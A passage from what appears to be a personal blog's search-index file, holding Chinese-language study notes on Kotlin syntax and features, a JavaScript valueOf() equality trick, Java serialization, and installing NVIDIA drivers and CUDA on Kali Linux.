    <title>JS中通过valueOf()让条件相等</title>
    <url>/posts/573c5369/</url>
    <content><![CDATA[如何使a&#x3D;&#x3D;1&amp;&amp;a&#x3D;&#x3D;2&amp;&amp;a&#x3D;&#x3D;3结果为true在js中，所有程序都是单线程运行的，即便写在一行，也是从左到右运行。因此为了使该条件成立，可以在读取a的值的同时，让a自增1。在该问题中使用valueOf()方法，这是js的内置方法，当js调用某个值时，会使用该方法。因此重写该方法时，既可以实现该问题。
let a = &#123;  value: 1,  valueOf: function()&#123;    return this.value++;  &#125;&#125;console.log(a==1&amp;&amp;a==2&amp;&amp;a==3)]]></content>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java序列化：实现对象传输</title>
    <url>/posts/8b5d4862/</url>
    <content><![CDATA[java对象为什么要实现Serialiable接口？Serializable是java.io包中定义的、用于实现Java类的序列化操作而提供的一个语义级别的接口。Serializable序列化接口没有任何方法或者字段，只是用于标识可序列化的语义。实现了Serializable接口的类可以被ObjectOutputStream转换为字节流，同时也可以通过ObjectInputStream再将其解析为对象。例如，我们可以将序列化对象写入文件后，再次从文件中读取它并反序列化成对象，也就是说，可以使用表示对象及其数据的类型信息和字节在内存中重新创建对象。
关键就是可以通过流的形式实现对象的传输。]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin 协程与互操作</title>
    <url>/posts/2367fd91/</url>
    <content><![CDATA[暂存问题协程，kotlin和java互操作，kotlin和js互操作。委托。泛型。（最后两个可以暂时不用考虑）互操网上再学习
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kali Linux 安装英伟达显卡驱动和CUDA套件</title>
    <url>/posts/43a05df2/</url>
    <content><![CDATA[事情是这样子的，我最近刚装kali linux在我的笔记本上，想从windows转为linux体验一下，然后我访问Google浏览器发现我的cpu居然跑到了90%以上，风扇呼呼转，真的是见了鬼了。后来意识到，linux可能没有英伟达显卡的驱动这篇文章说明一下安装驱动的过程

确保仓库包含contrib和non-free部分。Kali默认就有此部分。
检查显卡


下面的命令会显示你现在的显卡是什么。┌──(root㉿kali)-[~]└─# lspci | grep -i vga10:22.0 VGA compatible controller: NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] (rev a1)┌──(root㉿kali)-[~]└─# 
为了查看nvidia显卡，可以安装nvidia-detect，并运行此软件。┌──(root㉿kali)-[~]└─# apt install nvidia-detect┌──(root㉿kali)-[~]└─# nvidia-detect Detected NVIDIA GPUs:09:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] [10de:1c03] (rev a1)Checking card:  NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] (rev a1)Uh oh. Failed to identify your Debian suite.


安装驱动


我们现在要安装nvidia闭源驱动和CUDA套件。apt install -y nvidia-driver nvidia-cuda-toolkit
然后重启电脑reboot
查看是否安装好驱动nvidia-smi


该文章引用自https://khdxs7.site/archives/Install_NVIDIA_GPU_Drivers.html

]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 基础类型和集合</title>
    <url>/posts/1bbbd9a0/</url>
    <content><![CDATA[继续学习
元组(Tuple)有两种元组，Pair(a,b),Triple(a,b,c)他们属于简单类型，被赋值的元素可以通过次序来调用他们
var result = Triple(1,2,3)   println(result)   println(result.first)   println(result.second)
init对象内的初始化方法，当对象被创建时，便会调用该方法。每次创建都会调用init。
array和Listarray数组，它可以通过arrayOf()来创建。其中可以放不同种类的数据类型。数组是不可变的，他没有增加和删减的方法。如果需要改变数组的内容，可以让他重新赋值，通过plus来新增数据
var c = arrayOf(1,&quot;滚犊子&quot;,4,5)    c = c.plus(arrayOf(1,2,3,4))    println(c)    println(c.contentToString())
而且array类型的toString()并没有重写，如果需要输出具体数据内容的话，需要使用contentToString()而list也有两种List和MutableList，第一种和array类型，MutableList才可以修改。但是list都重写了toString()方法，可以直接输出具体数据。
setset集合也很简单，他不允许有重复的元素，并且没有特定的排序方式
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 多平台 Web 应用工具包</title>
    <url>/posts/b469765b/</url>
    <content><![CDATA[ktorktor是由JetBrains构建的多平台工具包，用于在kotlin中创建Web应用程序。Ktor 是一个轻松构建联网应用（web 应用、 HTTP 服务、 移动应用以及浏览器应用）的框架。 现代的联网应用需要异步化来提供最佳的用户体验，而 Kotlin 协程为此提供了极其简便的方式。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>ktor</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin 符号，高阶函数，内联函数，Lambda 表达式</title>
    <url>/posts/d375efb0/</url>
    <content><![CDATA[特殊符号?表示  是否允许空值的存在!!表示  如果对象为null，那么系统一定会报异常！?:表示  对象A ?: 对象B 表达式，意思为，当对象 A值为 null 时，那么它就会返回后面的对象 B。::表示  Kotlin 中 双冒号操作符 表示把一个方法当做一个参数，传递到另一个方法中进行使用，通俗的来讲就是引用一个方法。-&gt;表示 一般用于函数类型的连接符号===和==的区别 在Kotlin中，&#x3D;&#x3D;&#x3D; 表示比较对象地址，&#x3D;&#x3D; 表示比较两个值大小。
高阶函数一个函数如果参数类型是函数或者返回值类型是函数，那么这就是一个高阶函数。
函数类型其实就是将函数的 “参数类型” 和 “返回值类型” 抽象出来例如:
var add(a:Int,b:Int) = a+b
他的函数类型就是(Int,Int)-&gt;Int而高阶函数意味着他而已接受一个函数的参数，或者他返回一个函数。例如：
//在以下main函数中，将show函数传递给了showUserName作为参数使用。//除了可以使用已存在的函数，也可以现写一个函数//同样的，可以用lambda语法来写函数fun main()&#123;    showUserName(&quot;zfxt&quot;,::show)    //showUserName(&quot;zfxt&quot;,fun(s:String)&#123;println(s)&#125;)    //showUserName(&quot;zfxt&quot;,&#123;s:String-&gt;println(s)&#125;)//过长的lambda语法函数可以写在（）外面，如下//showUserName(&quot;zfxt&quot;) &#123;s:String-&gt;println(s)&#125;&#125;fun  show(s: String) = println(s)fun showUserName(name:String,show:(String)-&gt;Unit)&#123;    show(name)&#125;
内联函数（inline）一般情况下，调用函数。也就是将程序执行顺序转移到内存中存放该函数的位置，执行完后，再返回现场重新执行原本的内容。其中转换过程都是采用压栈和出栈的方式。而对于那些频繁调用的函数，将会有很大的时间和空间开销，因此使用内联函数，他的作用就是将函数体直接放在主进程内。用空间开销换时间开销。

支持 return 退出函数
禁止内联：noinline// 在 main() 中调用 makeTest()fun main() &#123;    Log.i(&quot;zc_test&quot;, &quot;main() start&quot;)    makeTest()    Log.i(&quot;zc_test&quot;, &quot;main() end&quot;)&#125;// 内联函数 makeTest()private inline fun makeTest() &#123;    Log.i(&quot;zc_test&quot;, &quot;makeTest&quot;)&#125;

Lambda表达式他是定义匿名函数的简单形式
val sum = &#123;x:Int,y:Int -&gt; x+y&#125;
其中，参数声明放在-&gt;前面，函数体放在-&gt;后面还可以将可选标注先留下
val sum:(Int,Int)-&gt;Int = &#123;x,y-&gt;x+y&#125;
在kotlin中，如果一个函数的最后一个参数是lambda表达式，那么可以直接将表达式写在括号外面。如果只有一个参数，那么直接省略小括号。
  
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 继承与重写</title>
    <url>/posts/6bfa3df5/</url>
    <content><![CDATA[继承kotlin中所有的类都继承自Any类，他是所有类的超类。Any 默认提供了三个函数：
equals()hashCode()toString()
在kotlin中，父类被定义为基类。如果子类有主构造函数，那么子类在主构造函数时，就要初始化父类的属性。如果子类是使用次构造函数，那么通过super标签继承父类的构造函数，可以是父类的主构造函数，也可以是次构造函数。
class Student : Person &#123;    constructor(ctx: Context) : super(ctx) &#123;    &#125;     constructor(ctx: Context, attrs: AttributeSet) : super(ctx,attrs) &#123;    &#125;&#125;
重写在基类中，使用fun声明函数时，此函数默认为final修饰，不能被子类重写。如果允许子类重写该函数，那么就要手动添加 open 修饰它, 子类重写方法使用 override 关键词：可以用var重写一个val的属性，但是不能用val重写一个var的属性，因为val不具备setter方法，无法正确继承并重写。
子类重写父类的方法时，是可以继承其函数体的，通过super来实现。例如：
interface A &#123;    fun foo() &#123; print(&quot;A&quot;) &#125;   // 已实现    fun bar()                  // 未实现，没有方法体，是抽象的&#125; interface B &#123;    fun foo() &#123; print(&quot;B&quot;) &#125;   // 已实现    fun bar() &#123; print(&quot;bar&quot;) &#125; // 已实现&#125; class C : A &#123;    override fun bar() &#123; print(&quot;bar&quot;) &#125;   // 重写&#125; class D : A, B &#123;    override fun foo() &#123;        super&lt;A&gt;.foo()        super&lt;B&gt;.foo()    &#125;     override fun bar() &#123;        super&lt;B&gt;.bar()    &#125;&#125; fun main(args: Array&lt;String&gt;) &#123;    val d =  D()    d.foo();    d.bar();&#125;]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 类与对象概要</title>
    <url>/posts/838a94ca/</url>
    <content><![CDATA[类与对象用class声明可以像普通函数一样使用构造函数创建类。
val site = Runoob() // Kotlin 中没有 new 关键字
要使用类中的属性直接用.来引用即可。
主构造器，直接作为类头部的一部分，位于类名后。class Person constructor(firstName: String) &#123;&#125;
如果没有特别的注解可以省略contstructor的关键字。如果构造器有注解，或者有可见度修饰符，这时constructor关键字是必须的，注解和修饰符要放在它之前。
getter和setter默认会实现getter方法和setter方法，val不会有setter方法。field指的就是存储在属性中的值。field 关键词只能用于属性的访问器示例：
class Person &#123;    var lastName: String = &quot;zhang&quot;        get() = field.toUpperCase()   // 将变量赋值后转换为大写        set    var no: Int = 100        get() = field                // 后端变量        set(value) &#123;            if (value &lt; 10) &#123;       // 如果传入的值小于 10 返回该值                field = value            &#125; else &#123;                field = -1         // 如果传入的值大于等于 10 返回 -1            &#125;        &#125;    var heiht: Float = 145.4f        private set&#125;// 测试fun main(args: Array&lt;String&gt;) &#123;    var person: Person = Person()    person.lastName = &quot;wang&quot;    println(&quot;lastName:$&#123;person.lastName&#125;&quot;)    person.no = 9    println(&quot;no:$&#123;person.no&#125;&quot;)    person.no = 20    println(&quot;no:$&#123;person.no&#125;&quot;)&#125;
其中的get，set方法也都可以设置为public或者private。
class类中，如果属性不是在主构造器中定义的，必须有初始化，或者lateinit属性。lateinit允许延迟初始化
init初始化代码，允许放在初始代码段中。用init关键字作为前缀
class Person constructor(firstName: String) &#123;    init &#123;        println(&quot;FirstName is $firstName&quot;)    &#125;&#125;
次构造函数次构造函数必须加前缀constructor如果类有主构造函数，那么每个次构造函数必须直接或间接代理主构造函数，可以理解为继承。例如：
class Person(val name: String) &#123;    constructor (name: String, age:Int) : this(name) &#123;        // 初始化...    &#125;&#125;

注意：在 JVM 虚拟机中，如果主构造函数的所有参数都有默认值，编译器会生成一个附加的无参的构造函数，这个构造函数会直接使用默认值。这使得 Kotlin 可以更简单的使用像 Jackson 或者 JPA 这样使用无参构造函数来创建类实例的库。
class Customer(val customerName: String = &quot;&quot;)
对象的属性必须用var或者val表明出来，当然它也可以简写在主构造器中，可以简单的表示出来。如果没用var或者val修饰，那么他只是一个普通的参数，而不是一个对象的属性。而且只有主构造器才可以这样直接声明属性，次构造器不允许这样子使用

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 语言特性：DTO、默认参数、集合操作</title>
    <url>/posts/70f6f63b/</url>
    <content><![CDATA[创建 DTO （POJO&#x2F;POCO）data class Customer(val name: String, val email: String)
会为 Customer 类提供以下功能：
所有属性的 getter （对于 var 定义的还有 setter）

equals()
hashCode()
toString()
copy()
所有属性的 component1()、 component2()……等等

可以设置函数的默认参数,同样该默认参数也可以设置在类中。fun foo(a: Int = 0, b: String = &quot;&quot;) &#123; …… &#125;
过滤list列表使用filter方法。
val positives = list.filter &#123; x -&gt; x &gt; 0 &#125;//或者更短val positives = list.filter &#123; it &gt; 0 &#125;
map的使用方法val map = mapOf(&quot;a&quot; to 1, &quot;b&quot; to 2, &quot;c&quot; to 3)
访问map条目print(map[&quot;key&quot;])map[&quot;key&quot;] = value
区间迭代for (i in 1..100) &#123; …… &#125;  // 闭区间：包含 100for (i in 1 until 100) &#123; …… &#125; // 半开区间：不包含 100for (x in 2..10 step 2) &#123; …… &#125;for (x in 10 downTo 1) &#123; …… &#125;(1..10).forEach &#123; …… &#125;]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin中的抽象、内部类、接口及修饰符</title>
    <url>/posts/322eea29/</url>
    <content><![CDATA[抽象类用abstarct来声明一个类为抽象类。嵌套类即为类内部的内部类。用inner来比奥是要给内部类。内部类有个对外部的对象的引用，所以内部类可以访问成员属性和成员函数。
class Outer &#123;    private val bar: Int = 1    var v = &quot;成员属性&quot;    /**嵌套内部类**/    inner class Inner &#123;        fun foo() = bar  // 访问外部类成员        fun innerTest() &#123;            var o = this@Outer //获取外部类的成员变量            println(&quot;内部类可以引用外部类的成员，例如：&quot; + o.v)        &#125;    &#125;&#125;
inner类属于私有类，私有类不允许在主构造器中使用lateinit属性。
接口接口的属性需要自己定义get，set方法，他不会帮你定义。接口中的成员变量默认为open的，可以被重写和继承在kotlin的接口中，他的方法是可以拥有方法体的。但是接口中的属性只能是抽象的，不允许初始化值，实现接口时，必须重写属性。或者如果初始化，必须完善他的get和set方法，因为他不会提供set和get方法。
类的修饰符
classModifier: 类属性修饰符，标示类本身特性。abstract    &#x2F;&#x2F; 抽象类final       &#x2F;&#x2F; 类不可继承，默认属性enum        &#x2F;&#x2F; 枚举类open        &#x2F;&#x2F; 类可继承，类默认是final的annotation  &#x2F;&#x2F; 注解类
accessModifier: 访问权限修饰符private    &#x2F;&#x2F; 仅在同一个文件中可见protected  &#x2F;&#x2F; 同一个文件中或子类可见public     &#x2F;&#x2F; 所有调用的地方都可见internal   &#x2F;&#x2F; 同一个模块中可见

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin(lambda函数）</title>
    <url>/posts/19762a99/</url>
    <content><![CDATA[lambdalambda表达式根据图片可以比较清晰的了解lambda的语法，他通过-&gt;将参数和函数体分开，参数不用带小括号，整体都用一个中括号括起来，箭头右边写函数体，函数体可以写多行，最后一行做为表达式的值传递回去。为了让你加深理解。

实例1：fun main(args: Array&lt;String&gt;) &#123;    //&#123;x:Int,y:Int -&gt; x+y&#125;本身就是一个函数    println(&#123;x:Int,y:Int -&gt; x+y&#125;(1,2))&#125;
以上内容，肯定了lambda函数表达式，他本身就是一个函数，可以直接使用。像一个正常函数一样。但是这样子意义不大，就像是刻意为之
实例2：fun main(args: Array&lt;String&gt;) &#123;    var sum = &#123;x:Int,y:Int -&gt; x+y&#125;    println(sum(1,3))&#125;
kotlin作为函数式编程语言。他可以直接把函数传递给一个变量存储。而且该变量可以被其他类，函数所接受。这也是kotlin的一大特点之一。这个被保存到函数同样可以像正常函数一样使用。

注意点通常使用lambda函数有一些特点0. 如果传递进去的参数类型是可知的，可以直接省略掉该参数的类型声明，而直接交给编译器，自动推导

如果只有一个参数，那么这个参数可以直接省略，用it来代替
如果函数被作为一个方法的参数，而且是最后一个参数，那么这个函数可以被写在小括号后面，单独列出来。
如果一个类或者一个方法接受一个函数作为变量，而且只接受一个变量，那么可以直接省略小括号，直接放lambda函数上去（当然，不用lambda也行，用其他的函数体）

在作用域中访问变量在kotlin中，他的lambda函数不仅可以获取到局部变量，还可以修改这个局部变量。我们称这些变量被lambda捕捉
fun main(args: Array&lt;String&gt;) &#123;    val num0 = &quot;测试获取val数据&quot;    var num1 = 1    var add = &#123;        println(num0)        num1++    &#125;    repeat(4) &#123;        println(num1)        add()    &#125;&#125;
展现结果为：实现细节：

首先，在java中，他只允许你捕捉final变量，也就是kotlin中的val变量，他们不可被修改，只能读取。
当你捕捉val变量时，系统会将这个值和lambda代码一起存储。
当你要捕获var变量，并进行更改时，他会采用两种方法之一，要么声明一个单元素的数组，其中存放可变值。或者创建一个包装类的实例，把这个var变量作为该实例的一个属性，而且可以修改。在上述图片中，第一段代码就是对第二段代码的解释。当kotlin中捕获一个var变量时，他会创建一个val的包装类，然后存储该包装类的实例，而这个包装类因为时val的，所以很好获取。

注意事项如果 lambda 被用作事件处理器或者用在其他异步执行的情况，对局部变量的修改只会在 lambda 执行的时候发生。意思是说，如果你这个lambda函数作为异步处理的，所以你修改的这个局部变量最好能够通过其他类，或者全局保存。不然他将无法修改成功。
成员引用他的使用场景是，当你需要把一个已经定义好的函数抠下来，作为一个参数传递给其他需要使用这个函数参数的地方。这种表达式称为成员引用，用双冒号把你要引用的成员（一个属性或者一个方法）和类名称隔开。

如果是顶层函数，可以直接用::方法名获取

构造方法可以用构造方法引用 存储或者延期执行创建类实例的动作 构造方法引用的形式，是在双冒号后指定类名称：不难理解，所以直接跳过
详解成员引用成员引用和调用该函数的 lambda 具有一样的类型，所以可以互换使用：这句话请深刻记忆，他很重要。
顶层函数直接从顶层方法中获取的方法，他不需要再接受额外的参数，可以直接通过run方法去执行他的函数体，如下：
fun salute() = println(&quot;Salute !&quot;)···fun main()&#123;	salute()	run(::salute)&#125;
这两个语句的执行结果一致，都会输出Salute !。如果这个函数有参数的话，而run方法默认是不带参数的。源码如下：
@kotlin.internal.InlineOnlypublic inline fun &lt;R&gt; run(block: () -&gt; R): R &#123;    contract &#123;        callsInPlace(block, InvocationKind.EXACTLY_ONCE)    &#125;    return block()&#125;
因此可以通过其他方法，比如用一个参数去接受函数体，然后像正常函数一样执行。
非顶层函数如果是某个类中的函数，那么他会有一个限制。那就是如果你要使用这个函数的话，他一定需要传入一个他该类的实例进去，不然就会语法报错。例如：
class Car &#123;    fun getSex() = println(&quot;不男不女&quot;)&#125;fun main() &#123;    var getSex = Car::getSex    getSex(Car())&#125;
他要求必须传入一个实例进去。但是在kotlin1.1后版本更新，允许进行绑定引用。也就是直接引用来自实例的方法。如下：
import kotlin.reflect.KFunction1class Car &#123;    fun getSex() = println(&quot;不男不女&quot;)&#125;fun main() &#123;    var car = Car()    var getSex = car::getSex    getSex()&#125;
以上
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin基础：变量、函数、循环、集合</title>
    <url>/posts/3cd18efd/</url>
    <content><![CDATA[基础main函数fun main() &#123;    println(&quot;Hello world!&quot;)&#125;
print，println输出到屏幕上。
函数默认不填即为Unit。when类似于switch，if else 只要有结果判定成功，便不再往下判断。Unit标识无返回类型&#x3D;&gt;void前变量名，后数据类型使用${}作为占位符
//sampleStartfun sum(a: Int, b: Int): Int &#123;    return a + b&#125;//sampleEndfun sum(a: Int, b: Int) = a + bfun main() &#123;    println(&quot;sum of 19 and 23 is $&#123;sum(19, 23)&#125;&quot;)    printSum(-11,53)&#125;fun printSum(a: Int, b: Int): Unit &#123;    println(&quot;sum of $a and $b is $&#123;a + b&#125;&quot;)&#125;
变量如果有赋值，那么它可以自动推出变量类型，否则需要声明变量类型val 只读变量，不可以修改var 可读可改变量const val 常量，必须定义在函数之外。
val a: Int = 1  // 立即赋值    val b = 2   // 自动推断出 `Int` 类型    val c: Int  // 如果没有初始值类型不能省略    c = 3       // 明确赋值
类与实例类的属性可以在声明或者主体中列出要继承一个类，需要使用:,类一遍情况下都默认为final类型，所以要声明为open
open class Shapeclass Rectangle(var height:Double,var length:Double) : Shape()&#123;    var perimeter = (height+length) * 2&#125;fun main() &#123;    var rectangle = Rectangle(10.1,20.0)//必须使用.0不然直接运行不了    println(rectangle.perimeter)&#125;
单行多行注释// 这是一个行注释/* 这是一个多行的   块注释。 */
字符串模板用${a}来把变量a合并到字符串中。也可以简写为$a。它可以使用模板es6的语法如下所示
val price = &quot;&quot;&quot;$&#123;&#x27;$&#x27;&#125;_9.99&quot;&quot;&quot;
条件表达式if else （特殊：他本身也可以作为表达式来使用）
var m =  if (a &gt; b) a else b  &lt;=&gt;  m = a&gt;b ? a :b 三元表达式
for循环sampleStartvar items = listOf(&quot;apple&quot;,&quot;banana&quot;,&quot;xigua&quot;)    for (item in items)&#123;        println(item)    &#125;//sampleEnd//indices表示index//indeces 表示的是一个集合类型，包括从(0...list.size-1)//$&#123;items[index]&#125; = $&#123;items[item]&#125;for (index in items.indices) &#123;        println(&quot;item at $index is $&#123;items[index]&#125;&quot;)    &#125;
while循环var index = 0    while (index &lt; items.size)&#123;        println(&quot;item in $index is $&#123;items[index]&#125;&quot;)        index++    &#125;
when表达式&lt;&#x3D;&gt;switch case但是他的可操作性更强，没有了固定的约束fun decsribe(obj:Any):String = when(obj) &#123;    1 -&gt; &quot;One&quot;    2 -&gt; &quot;Two&quot;    &quot;Hello&quot;    -&gt; &quot;Greeting&quot;    is Long    -&gt; &quot;Long&quot;    !is String -&gt; &quot;Not a string&quot;    else       -&gt; &quot;Unknown&quot;&#125;
使用区间（range）它满足前闭后闭
//使用 in 操作符来检测某个数字是否在指定区间内 val x = 10    val y = 9    if(x in 1..y+1)&#123;        println(&quot;fits in range&quot;)    &#125;//最后可以正确输出结果//检测某个数字是否在指定区间外。   val list = listOf(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;)    if (-1 !in 0..list.lastIndex) &#123;        println(&quot;-1 is out of range&quot;)    &#125;    if (list.size !in list.indices) &#123;        println(&quot;list size is out of valid list indices range, too&quot;)    &#125;//in也可用在for，while循环中区间迭代for (x in 1..5) &#123;        print(x)    &#125;//或者数列迭代，并控制步进大小for(x in 1..5 step 2)&#123;        println(x)    &#125;    for(x in 10 downTo -3 step 3)&#123;        println(x)    &#125;
集合使用 in 操作符来判断集合内是否包含某实例。
fun main() &#123;    val items = setOf(&quot;apple&quot;, &quot;banana&quot;, &quot;kiwifruit&quot;)//sampleStart    when &#123;        &quot;orange&quot; in items -&gt; println(&quot;juicy&quot;)        &quot;apple&quot; in items -&gt; println(&quot;apple is fine too&quot;)    &#125;//sampleEnd&#125;
使用 lambda 表达式来过滤（filter）与映射（map）集合：
fun main() &#123;//sampleStart    val fruits = listOf(&quot;banana&quot;, &quot;avocado&quot;, &quot;apple&quot;, &quot;kiwifruit&quot;)    fruits      .filter &#123; it.startsWith(&quot;a&quot;) &#125;      .sortedBy &#123; it &#125;      .map &#123; it.uppercase() &#125;      .forEach &#123; println(it) &#125;//sampleEnd&#125;
空值和空检测当可能用 null 值时，必须将引用显式标记为可空。可空类型名称以问号（?）结尾。
fun parseInt(str: String): Int? &#123;    return str.toIntOrNull()&#125;//sampleStartfun printProduct(arg1: String, arg2: String) &#123;    val x = parseInt(arg1)    val y = parseInt(arg2)    // 直接使用 `x * y` 会导致编译错误，因为它们可能为 null    if (x != null &amp;&amp; y != null) &#123;        // 在空检测后，x 与 y 会自动转换为非空值（non-nullable）        println(x * y)    &#125;    else &#123;        println(&quot;&#x27;$arg1&#x27; or &#x27;$arg2&#x27; is not a number&quot;)    &#125;&#125;//sampleEndfun main() &#123;    printProduct(&quot;6&quot;, &quot;7&quot;)    printProduct(&quot;a&quot;, &quot;7&quot;)    printProduct(&quot;a&quot;, &quot;b&quot;)&#125;
类型检测和自动类型转化is 操作符检测一个表达式是否某类型的一个实例，当某个变量进行判断后，他会自动转换为这个类型，并作为该类型使用即便是在判断的右侧他也会自动转化为对应的判断类型。如下：
fun getStringLength(obj: Any): Int? &#123;  // 在 `&amp;&amp;` 运算符的右侧, `obj` 的类型会被自动转换为 `String`  if (obj is String &amp;&amp; obj.length &gt; 0)    return obj.length  return null&#125;
//sampleStartfun getStringLength(obj: Any): Int? &#123;    if (obj is String) &#123;        // `obj` 在该条件分支内自动转换成 `String`        return obj.length    &#125;    // 在离开类型检测分支后，`obj` 仍然是 `Any` 类型    return null&#125;//sampleEndfun main() &#123;    fun printLength(obj: Any) &#123;        println(&quot;Getting the length of &#x27;$obj&#x27;. Result: $&#123;getStringLength(obj) ?: &quot;Error: The object is not a string&quot;&#125; &quot;)    &#125;    printLength(&quot;Incomprehensibilities&quot;)    printLength(1000)    printLength(listOf(Any()))&#125;
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin和Java互操作限制与解决方案</title>
    <url>/posts/60ffe3d5/</url>
    <content><![CDATA[正常情况下，kotlin做为优化后的java他们两是可以做到相互操作的。而且可以没有任何第三方库加持。而在某些时候会发现他们不能一起使用。会报以下错误
Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: entity/SSchool	at MainKt.test(Main.kt:19)	at MainKt.main(Main.kt:16)Caused by: java.lang.ClassNotFoundException: entity.SSchool	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:641)	at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:188)	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)	... 2 more
下图是目录结构解决办法就是，在main下在建立一个java的目录，这样子，把java的类移植过来，此时，他们公用一个resource。再把entity移植过去，此时，他们就可以正常使用了。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin委托机制概述</title>
    <url>/posts/a685112b/</url>
    <content><![CDATA[kotlin委托机制就我目前遇到的问题时，该知识点并不需要我太关心，因此挂一个链接在这掘金
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin延迟初始化和密封类，内部类</title>
    <url>/posts/c2dfd577/</url>
    <content><![CDATA[延迟初始类
这个应用的前提：很多情况下，我们会先初始化一个类，但是因为没有给他赋值，就给他赋值为null。如:

private var adapter: MsgAdapter? = null

而在kotlin中，对于可能为空的变量，需要进行很多次非空判断，非空保护，即便你知道他不可能为空。以满足他的语法规则。
延迟初始化然后这里提供一种方法：
private lateinit var adapter: MsgAdapter
lateinit这个关键字表明当前这个变量不会立刻初始化，而是会在后面的步骤中赋值。但是他也有一个问题，如果你在使用这个变量时，没有赋值，他会抛出没有初始化的异常UninitializedPropertyAccessException。解决这个问题的方法就是在给他初始化的时候加一个判断是否初始化。
if (!::adapter.isInitialized) &#123; adapter = MsgAdapter(msgList) &#125;
 这是一个固定的语法规则，能判断是否完成初始化。
密封类密封类的关键字是sealed class,使用它可以构建一个密封类。使用场景：在kotlin中，当你使用when函数时，总是需要else判断条件的。有时候你已经把可以枚举的可能性都枚举完后任然需要else。通常我们的做法是抛出一个异常使其编译通过。比如：
sealed class Resultclass Success(val msg: String) : Result()class Failure(val error: Exception) : Result()···fun getResultMsg(result: Result) = when (result) &#123; is Success -&gt; result.msg is Failure -&gt; &quot;Error is $&#123;result.error.message&#125;&quot;&#125;···
如果我们使用了密封类的话，我们就必须在这种when的情况下，把所有的条件枚举出来，不然会语法报错。他的作用就是减少了出错的可能性，同时这里也不用写else了。
内部类区分：内部类和嵌套类，简单点就是内部类可以作为一个类的内部成员，可以引用到外部类，也就是这个整体。但是嵌套类不可以。默认不加inner就是嵌套类



类A在类B中的声明
在java中
在kotlin中



嵌套类（不存储外部类的引用）
static class A
class A


内部类（存储外部类的引用)
class A
inner class A


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin扩展：新增方法，修改属性</title>
    <url>/posts/2ddd2429/</url>
    <content><![CDATA[kotlin扩展扩展函数，它可以在已有类中添加新方法，而不对原类做出修改。
fun receiverType.functionName(params)&#123;    body&#125;

例如：
class User(var name:String)- receiverType：表示函数的接收者，也就是函数扩展的对象- functionName：扩展函数的名称- params：扩展函数的参数，可以为NULL/**扩展函数**/fun User.Print()&#123;    print(&quot;用户名 $name&quot;)&#125;fun main(arg:Array&lt;String&gt;)&#123;    var user = User(&quot;Runoob&quot;)    user.Print()&#125;

扩展函数是静态解析的。package top.zfxtopen class a&#123;    open fun out()&#123;        println(&quot;我是a的函数&quot;)    &#125;&#125;class b:a()&#123;    override fun out()&#123;        println(&quot;我是b的函数&quot;)    &#125;&#125;fun printout(a:a)&#123;    println(a.out())&#125;//扩展函数fun a.foo()=&quot;a&quot;fun b.foo()=&quot;b&quot;//写一个函数来判断扩展函数是否也满足动态绑定。fun printfoo(a:a)&#123;    println(a.foo())&#125;fun main() &#123;    var user:a = b()    //第一个user表明，他任然是满足动态绑定的。可以实现java中所理解的动态绑定。    user.out()    //第二个函数中也与上一个一致    printout(b())    //第三个函数用来判断扩展函数是否满足动态绑定    printfoo(b())&#125;
结果展示
我是b的函数我是b的函数kotlin.Unita
如果函数没有继承，那么两个父子类他们都具有同名的函数，此时，会根据传递进去时要求的参数类型判断是执行什么函数。
若扩展函数和成员函数一致，则使用该函数时，会优先使用成员函数。class C &#123;    fun foo() &#123; println(&quot;成员函数&quot;) &#125;&#125;fun C.foo() &#123; println(&quot;扩展函数&quot;) &#125;fun main(arg:Array&lt;String&gt;)&#123;    var c = C()    c.foo()&#125;
同样的，kotlin也可以扩展属性，但是他扩展属性并不能初始化，只能通过修改他的get和set方法。
val &lt;T&gt; List&lt;T&gt;.lastIndex: Int    get() = size - 1//正确，修改了lastIndex的属性方法。val Foo.bar = 1 // 错误：扩展属性不能有初始化器
伴生对象这个伴生对象可以理解为是静态属性和静态方法。
class MyClass &#123;    companion object &#123; &#125;  // 将被称为 &quot;Companion&quot;&#125;fun MyClass.Companion.foo() &#123;    println(&quot;伴随对象的扩展函数&quot;)&#125;val MyClass.Companion.no: Int    get() = 10fun main(args: Array&lt;String&gt;) &#123;    println(&quot;no:$&#123;MyClass.no&#125;&quot;)    MyClass.foo()&#125;//或者直接在伴生对象中说明他的方法和属性都是被允许的class Student&#123;    companion object&#123;        fun add(a:Int,b:Int) = a+b    &#125;&#125;
